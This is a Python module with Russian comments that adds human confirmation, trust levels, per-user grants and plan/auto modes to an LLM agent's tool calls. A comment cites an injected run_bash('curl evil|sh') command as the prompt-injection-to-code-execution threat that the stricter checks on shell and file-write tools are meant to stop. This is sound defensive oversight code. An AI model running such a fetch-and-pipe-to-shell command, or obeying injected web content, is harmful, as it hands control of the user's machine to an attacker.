"""
Human-in-the-loop: подтверждение side-effect действий перед исполнением — СЕМАНТИЧЕСКОЕ
и без спама.

Уровни доверия (от меньшего трения к большему):
  1. read-only тулы (config `skills.readonly`: посмотреть экран, уведомление) — без вопросов;
  2. грант («да, всегда» / config cli.allow / /auto) — однажды разрешённый skill.tool
     больше не спрашивается (персист в config.local.yml);
  3. остальное — вопрос человеку. Ответ разбирает МОДЕЛЬ (semantics.parse_reply):
     «да» → исполнить; «да, всегда» → исполнить + грант; «да, но …» → условие агенту
     (скорректировать и переспросить); «нет, …» → отказ с причиной; свободное указание
     («лучше открой gmail», «ты зацикливаешься») → следовать ему вместо плана.

Confirmer фронтенда возвращает bool (кнопки бота) или сырой текст (REPL). Нет confirmer'а
(headless) — deny by default. AGENT_DRY_RUN — независимый второй предохранитель.
"""
from __future__ import annotations

import inspect
from typing import Awaitable, Callable, Optional, Union

from omegaconf import OmegaConf

# browser_media — управление воспроизведением ПО ПРОСЬБЕ юзера («поставь на паузу»):
# подтверждать просьбу о паузе вопросом «разрешить паузу?» — абсурд.
_DEFAULT_READONLY = {"capture_screen", "analyze_screen", "notify",
                     "browser_see", "browser_read", "browser_media",
                     # навык code: обзор репо — read-only (без подтверждения);
                     # edit_file/run_bash сюда НЕ входят → проходят HITL + зависят от мода.
                     "glob_files", "grep_repo", "list_tree", "read_lines"}


# НЕОБРАТИМЫЕ/опасные тулзы: произвольный шелл и запись в ФС. Для них auto-accept (дефолт
# desktop) НЕ снимает подтверждение — снимает только полный `auto` (явный opt-in в тотальную
# автономию). Иначе впрыснутый из веб-контента run_bash("curl evil|sh") исполнился бы без
# чекпойнта (баг ревью SEC-1: injection→RCE). app_control/osascript сюда НЕ входят — там
# LLM-строки экранируются _esc() в строковые литералы AppleScript (do shell script недостижим).
_DEFAULT_DANGEROUS = {"run_bash", "edit_file"}


def _load_cfg() -> tuple[bool, set[str], set[str], set[str]]:
    try:
        cfg = OmegaConf.load("config.yml")
        require = bool(cfg.get("agent", {}).get("require_confirmation", False))
        skills = set(cfg.get("skills", {}).get("confirm", []) or [])
        readonly = set(cfg.get("skills", {}).get("readonly", []) or []) or set(_DEFAULT_READONLY)
        dangerous = set(cfg.get("skills", {}).get("dangerous", []) or []) | set(_DEFAULT_DANGEROUS)
        return require, skills, readonly, dangerous
    except Exception:  # noqa: BLE001
        return False, set(), set(_DEFAULT_READONLY), set(_DEFAULT_DANGEROUS)


REQUIRE_CONFIRMATION, CONFIRM_SKILLS, READONLY_TOOLS, DANGEROUS_TOOLS = _load_cfg()

# Гранты разделены (анти-эскалация на мульти-клиенте, баг ревью): операторский конфиг (cli.allow) —
# ГЛОБАЛЬНО намеренно; сессионное «да, всегда» одного юзера — ПЕР-ЮЗЕР (не течёт другим клиентам).
_config_grants: set[str] = set()            # из config cli.allow (оператор)
_user_grants: dict[str, set] = {}           # сессионные «да, всегда», по user_id


def _uid(user_id: Optional[str] = None) -> str:
    """user_id из аргумента или из run_context (граница запроса). '' = одиночный оператор (REPL)."""
    if user_id is not None:
        return user_id
    from . import run_context
    return run_context.current_user_id() or ""

# Режим работы агента (три состояния, выбор юзера):
#   manual      — подтверждения и уточнения задаются человеку;
#   auto-accept — действия подтверждаются АВТОМАТИЧЕСКИ, остальное (уточнения, выбор
#                 мышления) как обычно;
#   auto        — агент автономен ЦЕЛИКОМ: сам выбирает тип мышления, сам решает
#                 развилки (допущения), действия без подтверждений.
#   plan        — ПЛАНИРОВАНИЕ: side-effect действия НЕ исполняются (агент описывает их как
#                 шаги плана); read-only тулзы работают (исследовать можно). Аналог plan-mode у CLI.
WORK_MODES = ("manual", "auto-accept", "auto", "plan")
# Режим работы — ПЕР-ЮЗЕР с глобальным дефолтом (''): desktop/REPL = один оператор (''), на сервере
# каждый клиент свой. Глобальный '' — fallback (политика оператора), per-user — переопределение.
_work_mode: dict[str, str] = {}
_DEFAULT_MODE = "manual"


def set_work_mode(mode: str, user_id: Optional[str] = None) -> str:
    """Установить режим работы (для текущего/указанного юзера); неизвестное → manual."""
    m = mode if mode in WORK_MODES else "manual"
    _work_mode[_uid(user_id)] = m
    return m


def work_mode(user_id: Optional[str] = None) -> str:
    uid = _uid(user_id)
    return _work_mode.get(uid) or _work_mode.get("", _DEFAULT_MODE)  # per-user → глобальный дефолт


def is_auto() -> bool:
    """Подтверждения автоматом? (auto-accept и полный auto) — для ТЕКУЩЕГО юзера."""
    return work_mode() in ("auto-accept", "auto")


def full_auto() -> bool:
    """Полная автономия: агент сам выбирает мышление и решает развилки."""
    return work_mode() == "auto"


def is_plan() -> bool:
    """Режим планирования: side-effect действия не исполняются (только описываются)."""
    return work_mode() == "plan"


def set_auto(value: bool) -> None:
    """Совместимость: True → auto-accept, False → manual."""
    set_work_mode("auto-accept" if value else "manual")


def load_grants(keys, user_id: Optional[str] = None) -> None:
    """Гранты из конфига (cli.allow) при старте фронтенда — ОПЕРАТОРСКИЕ (глобально)."""
    _config_grants.update(str(k) for k in (keys or []))


def is_granted(key: str, user_id: Optional[str] = None) -> bool:
    """Разрешён ли skill.tool без вопроса: операторский конфиг ИЛИ сессионный грант ЭТОГО юзера."""
    return key in _config_grants or key in _user_grants.get(_uid(user_id), set())


def clear_grants(user_id: Optional[str] = None) -> None:
    """Сбросить сессионные гранты текущего/указанного юзера (операторский конфиг не трогаем)."""
    _user_grants.pop(_uid(user_id), None)


def grant(key: str, persist: bool = True, user_id: Optional[str] = None) -> None:
    """Разрешить skill.tool без дальнейших вопросов — для ЭТОГО юзера (не для всех).
    persist в config.local.yml ТОЛЬКО для оператора (uid=='' → REPL/desktop одиночный фронтенд):
    иначе рантайм-«да, всегда» клиента сервера стал бы ГЛОБАЛЬНЫМ грантом после рестарта (утечка
    per-user→global). На сервере (uid задан) грант остаётся сессионным, не персистится."""
    uid = _uid(user_id)
    _user_grants.setdefault(uid, set()).add(key)
    if persist and uid == "":          # персист — привилегия оператора, не клиента
        try:
            from .cli_config import get_cli, set_cli
            allow = list(get_cli("allow") or [])
            if key not in allow:
                allow.append(key)
                set_cli("allow", allow)
        except Exception:  # noqa: BLE001
            pass


Confirmer = Callable[[str], Union[bool, str, Awaitable]]
_confirmer: Optional[Confirmer] = None


def set_confirmer(fn: Optional[Confirmer]) -> None:
    """Регистрирует канал подтверждения текущего фронтенда (REPL/бот)."""
    global _confirmer
    _confirmer = fn


# Маркер отклонённого пользователем действия — по нему граф понимает, что это НЕ
# провал агента, а сознательный отказ: не ретраить и не винить ноды (см. step_executor).
REFUSAL_MARK = "⛔ОТКЛОНЕНО"


def _is_dangerous(skill_name: str, tool_name: str) -> bool:
    """Необратимая/шелл-тулза ИЛИ любой импортированный (сторонний) скилл — для них auto-accept
    не снимает подтверждение (снимает только полный auto). Сторонний код опасен по своей природе,
    даже если имя тула не в денилисте."""
    if tool_name in DANGEROUS_TOOLS:
        return True
    try:
        from .tools.skill_creation import _load_registry
        return bool(_load_registry().get(skill_name, {}).get("imported"))
    except Exception:  # noqa: BLE001
        return False


def needs_confirmation(skill_name: str) -> bool:
    """Side-effect навыки из config + ЛЮБОЙ импортированный (сторонний) скилл."""
    if not REQUIRE_CONFIRMATION:
        return False
    if skill_name in CONFIRM_SKILLS:
        return True
    try:  # импортированные OpenClaw-скиллы — сторонний код/CLI → всегда под подтверждением
        from .tools.skill_creation import _load_registry

        return bool(_load_registry().get(skill_name, {}).get("imported"))
    except Exception:  # noqa: BLE001
        return False


async def confirm_rich(description: str) -> tuple[bool, str, str]:
    """
    Спросить человека. Возвращает (approved, note, kind), kind:
      'yes' / 'always' — разрешено (always — ещё и грант у вызывающего);
      'condition' — согласие с условием: НЕ исполнять как есть, условие в note;
      'no' — отказ (note — причина); 'redirect' — указание вместо да/нет (note — что делать);
      'deny' — канала нет (headless): deny by default, НЕ выбор юзера (не учимся).
    """
    if _confirmer is None:
        return False, "", "deny"
    try:
        res = _confirmer(description)
        if inspect.isawaitable(res):
            res = await res
    except Exception:  # noqa: BLE001
        res = False
    if isinstance(res, bool):
        kind, note = ("yes" if res else "no"), ""
    else:
        from .semantics import parse_reply
        kind, note = await parse_reply(str(res), action=description)
    approved = kind in ("yes", "always")
    # Решение человека — сигнал контура (implicit feedback): в журнал прогона → эпизод →
    # отказы становятся фактами профиля. deny-by-default не пишем — это не выбор юзера.
    try:
        from . import interaction
        interaction.record_hitl(description, approved, note=note)
    except Exception:  # noqa: BLE001
        pass
    return approved, note, kind


async def confirm(description: str) -> bool:
    """True — человек разрешил. Нет confirmer'а → deny by default. (Совместимость.)"""
    approved, _note, _kind = await confirm_rich(description)
    return approved


def _log_decision(action: str, approved: bool, kind: str = "", note: str = "") -> None:
    """Лог accept/reject решения в .sea/ (no-op без `sea init`). Не роняет тул при ошибке."""
    try:
        from .sea_workspace import log_decision
        log_decision(action, approved, kind, note)
    except Exception:  # noqa: BLE001
        pass


def wrap_with_confirmation(t, skill_name: str):
    """Оборачивает LangChain-tool уровнями доверия: read-only и грантованное идёт сразу,
    остальное — семантическое подтверждение (см. докстринг модуля)."""
    from langchain_core.tools import StructuredTool

    async def _arun(**kwargs):
        key = f"{skill_name}.{t.name}"
        args_short = ", ".join(f"{k}={str(v)[:80]}" for k, v in kwargs.items())
        # PLAN-режим: side-effect тулзы НЕ исполняем — агент описывает их как шаги плана.
        # read-only сюда не попадают (они без обёртки). Аддитивно: активно только при plan-режиме.
        if is_plan() and t.name not in READONLY_TOOLS:
            _log_decision(f"{key}({args_short})", False, "plan")
            return (f"[PLAN] режим планирования: вызов {t.name}({args_short}) НЕ исполнен. "
                    f"Опиши это действие как шаг плана, не выполняя его.")
        # Опасные тулзы (шелл/запись ФС/сторонний код): auto-accept НЕ снимает вопрос — только
        # полный auto (явный opt-in). Иначе впрыснутый из веб-контента вызов исполнился бы без
        # чекпойнта (SEC-1). Грант («да, всегда» этого юзера) — сознательный per-tool opt-in, остаётся.
        auto_ok = full_auto() if _is_dangerous(skill_name, t.name) else is_auto()
        if t.name in READONLY_TOOLS or auto_ok or is_granted(key):
            return await t.ainvoke(kwargs)  # доверено: без вопроса (грант — текущего юзера)
        approved, note, kind = await confirm_rich(f"{key}({args_short})")
        _log_decision(f"{key}({args_short})", approved, kind, note)  # accept/reject → .sea/ (если init)
        if approved:
            if kind == "always":
                grant(key)  # «да, всегда» → этот тул больше не спрашиваем (персист)
            return await t.ainvoke(kwargs)
        if kind == "condition":
            return (f"Пользователь готов разрешить ТОЛЬКО при условии: «{note}». "
                    f"Скорректируй вызов {t.name} под это условие и вызови снова "
                    "(будет новое подтверждение). Если условие невыполнимо — сообщи об этом.")
        if kind == "redirect":
            return (f"Пользователь вместо подтверждения дал указание: «{note}». "
                    f"Вызов {t.name} НЕ выполнен. Следуй указанию пользователя — оно "
                    "приоритетнее изначального плана.")
        reason = f" Причина: «{note}»." if note else ""
        return (
            f"{REFUSAL_MARK}: пользователь не подтвердил вызов {t.name}.{reason} "
            "НЕ повторяй этот и любые похожие вызовы — сразу заверши и сообщи пользователю, "
            "что действие требует его подтверждения."
        )

    return StructuredTool(
        name=t.name,
        description=t.description,
        args_schema=t.args_schema,
        coroutine=_arun,
    )
